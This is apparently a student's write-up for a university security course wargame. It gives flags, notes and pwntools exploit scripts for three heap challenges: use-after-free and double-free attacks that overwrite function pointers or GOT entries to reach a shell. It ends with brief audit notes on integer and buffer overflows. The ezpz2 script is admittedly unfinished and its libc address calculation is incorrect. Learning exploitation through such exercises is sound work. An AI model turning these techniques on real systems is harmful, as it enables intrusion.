# COMP6447 Wargame 7
Written by WENG XINN CHOW (z5346077) on 30.07.2022

usemedontabuseme
=========================== 
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNy11c2VtZWRvbnRhYnVzZW1lIiwiaXAiOiIxMDMuMjE2LjE5MC4zNyIsInNlc3Npb24iOiI2MTMyOWY5NS1lZDVhLTQ3N2YtOGZlMC1lYmIwMTUxNmVlYjgifQ.HD71b766LRSPJv6P9ilUgZwl-XKyRqxSM8xZUtaezDQ}

General overview of problems faced 
------------------------------------- 
1. Had to understand how to leak the forward pointer of a free chunk in use-after-free. 
2. In order to get the forward pointer of the first clone, I created 2 clones, freed the second clone, then the first one. This makes the forward pointer in the first chunk to point at the second chunk.
3. I have been stucked here for a long time since I forgot to use docker at first. It didn't work without using docker.
4. The hint function pointer is at 12 bytes after the address of the forward pointer.
5. Malloc to get the chunks out of tcache. The hint function can be overwritten in the last malloc since we have reference to the address of the hint function pointer in the previous mallocs. 
6. Lastly, I got the ```/bin/sh``` shell by choosing H(2) in the interactive shell since the creation of the clone 2 returns the  address of the hint function pointer.

------------------ 
``` 
from pwn import *

# p = process("./usemedontabuseme")

host = "comp6447.wtf"
port = 22488
p = remote(host, port)

win = p32(0x0804967c)

p.recvlines(19)
p.sendline(b'A')
p.sendline(b'0')
p.sendline(b'A' * 8)

p.recvlines(10)
p.sendline(b'A')
p.sendline(b'1')
p.sendline(b'B' * 8)

p.recvlines(10)
p.sendline(b'B')
p.sendline(b'1')

p.recvlines(11)
p.sendline(b'B')
p.sendline(b'0')

p.recvlines(11)
p.sendline(b'D')
p.sendline(b'0')

p.recvlines(2)
p.recvuntil(b': ')
leak = u32(p.recv(4))
log.info(f"leak fd pointer: {hex(leak)}")
hint_pointer = leak - 0x20 + 12
log.info(f"hint function pointer: {hex(hint_pointer)}")

# Have reference to the address of the hint function pointer
# after malloc
p.recvlines(9)
p.sendline(b'C')
p.sendline(b'1')
p.sendline(p32(hint_pointer))

# Have reference to the address of the hint function pointer
# after malloc
p.recvlines(10)
p.sendline(b'A')
p.sendline(b'2')
p.sendline(p32(hint_pointer))

# Malloc to return the freed chunk from tcache
p.recvlines(10)
p.sendline(b'A')
p.sendline(b'3')
p.sendline(b'')

#  Overwrite the hint function pointer with win
p.recvlines(10)
p.sendline(b'A')
p.sendline(b'4')
p.sendline(win)

p.recvlines(10)
p.sendline(b'H')
p.sendline(b'2')

p.interactive()
``` 
ezpz1
=========================== 
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNy1lenB6MSIsImlwIjoiMTAzLjIxNi4xOTAuMzciLCJzZXNzaW9uIjoiOTAzZjY0YmUtOWUwMi00MTFkLTk4MzgtY2ExYTQ1NDk0MTFhIn0.bi2lpBgpK0mrLhjdI9DTCisv1g5cy7M5wosQn52qXHQ}

General overview of problems faced 
------------------------------------- 
1. Had to understand how system stores chunks in fastbins and tchache.
2. This challenge was a lot more complicated then the first one because two mallocs occur in one creation as well as two frees occur in one deletion.
3. The main idea was to overwrite the print question function with win. However, the problem comes in when we could only overwrite the question itself, rather than the print question function pointer.
4. A single use-after-free or double-free approach didn't work because of of the problems stated above. Here, I used a combination of use-after-free and double-free.
5. Thus, I spent a long time solving this since the forward pointers could be quite confusing when we are freeing the chunks. 
6. Had to reverse the binary plenty of time to view those malloced and free chunks so I could figure out when to use  use-after-free and double-free accordingly.

------------------ 
``` 
from pwn import *

# p = process("./ezpz1")

host = "comp6447.wtf"
port = 18373 
p = remote(host, port)

win = 0x0804950c

p.recvlines(18)
p.sendline(b'C')

p.recvlines(9)
p.sendline(b'C')

p.recvlines(9)
p.sendline(b'D')
p.sendline(b'0')

p.recvlines(8)
p.sendline(b'D')
p.sendline(b'1')

p.recvlines(8)
p.sendline(b'D')
p.sendline(b'0')

p.recvlines(8)
p.sendline(b'D')
p.sendline(b'0')

p.recvlines(8)
p.sendline(b'C')

p.recvlines(9)
p.sendline(b'C')

p.recvlines(9)
p.sendline(b'D')
p.sendline(b'3')

p.recvlines(8)
p.sendline(b'S')
p.sendline(b'2')
p.sendline(p32(win))

p.recvlines(8)
p.sendline(b'A')
p.sendline(b'3')

p.interactive()
```
ezpz2
===========================
General overview of problems faced 
------------------------------------- 
1. Had to study GOT overwrite.
2. The difference between this and the last challenge is that this time, there was no print question function. 
3. I reckoned the main idea is to utilise GOT overwrite approach. In this case, we would have to overwrite the GOT printf address with system address in libc.
4. However, I couldn't seem to figure out how to leak libc addresses from heap. 

------------------ 
```
from cle import ELFCore
from pwn import *

p = process("./ezpz2")
libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)

# host = "comp6447.wtf"
# port = 11264 
# p = remote(host, port)

got_printf = 0x0804c010
log.info(f"got printf address: {hex(got_printf)}")

libc_printf = libc.symbols["printf"]
log.info(f"libc printf address: {hex(libc_printf)}")

libc.address = got_printf - libc_printf
system = libc.symbols["system"]
log.info(f"system address: {hex(system)}")

p.recvlines(18)
p.sendline(b'C')

p.recvlines(9)
p.sendline(b'C')

p.recvlines(9)
p.sendline(b'D')
p.sendline(b'0')

p.recvlines(8)
p.sendline(b'D')
p.sendline(b'1')

p.recvlines(8)
p.sendline(b'A')
p.sendline(b'1')

p.recvline()
p.recvuntil(b": '")
leak = u32(p.recv(4))
log.info(f"heap leak: {hex(leak)}")

p.recvlines(8)
p.sendline(b'D')
p.sendline(b'0')

p.recvlines(8)
p.sendline(b'D')
p.sendline(b'0')

p.recvlines(8)
p.sendline(b'C')

p.recvlines(9)
p.sendline(b'C')

p.recvlines(8)
p.sendline(b'D')
p.sendline(b'3')

p.recvlines(8)
p.sendline(b'S')
p.sendline(b'0')
p.sendline('/bin/sh')

p.recvlines(8)
p.sendline(b'S')
p.sendline(b'2')
p.sendline(p32(system))

p.recvlines(9)
p.sendline(b'A')
p.sendline(b'2')

p.interactive()
```
src challenge1 
================= 

General overview of problems faced 
-------------------------------------- 
lines:

12: Potential integer overflow due to signed int. There was no check for negative integers. A negative integer will pass the check but it will be explicitly  casted into unsigned int inside read function, causes a very large positive integer and  this leads to integer overflow.

src challenge2
================= 

General overview of problems faced 
--------------------------------------
lines:

78: Potential heap exploitation via use-after-free. The function doesn't free auth, therefore the user might still have access to user auth and somehow can try to overwrite it even after logging out.  
105: Buffer overflow due to the use of strncmp. We couldn't make sure that the buffer is at least 4 bytes or has a null terminator. If it has less than 4 bytes while not having  a null terminator, buffer overflow occurs. 

